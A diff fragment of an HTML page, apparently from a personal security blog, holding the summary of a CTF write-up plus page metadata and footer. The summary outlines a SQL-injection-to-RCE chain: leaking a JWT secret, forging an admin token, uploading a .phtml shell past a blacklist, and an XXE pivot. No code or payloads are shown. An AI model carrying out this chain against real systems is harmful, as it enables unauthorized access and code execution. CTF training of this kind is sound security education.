+          <p>A search box concatenates SQL, so we UNION out the JWT secret, forge an admin token, sneak a .phtml shell past a blacklist, and pivot through a UTF-16 XXE to find where it landed. SQLi to RCE, end to end.</p>
+          <div style="margin: 20px 0; padding-top: 16px; border-top: 1px solid var(--line); font-size: 13px; font-family: var(--mono); color: var(--muted); line-height: 1.8;">
+            <div><strong style="color:var(--ink)">Published:</strong> 2026-07-31</div>
+            <div><strong style="color:var(--ink)">Category:</strong> CTF</div>
+            
+          </div>
+          <a class="button" href="/writing/">Back to archive <span class="arrow" aria-hidden="true">←</span></a>
+        </aside>
+      </div>
+    </section>
+  </main>
+  <footer class="site-footer">
+    <div class="wrap">
+      <div class="footer-bottom">
+        <span>© 2026 · 0xAdham</span>
+        <a href="/writing/">Return to writing ↑</a>
+      </div>
+    </div>
+  </footer>
+  <script src="/assets/site.js" defer></script>
+</body>
+</html>
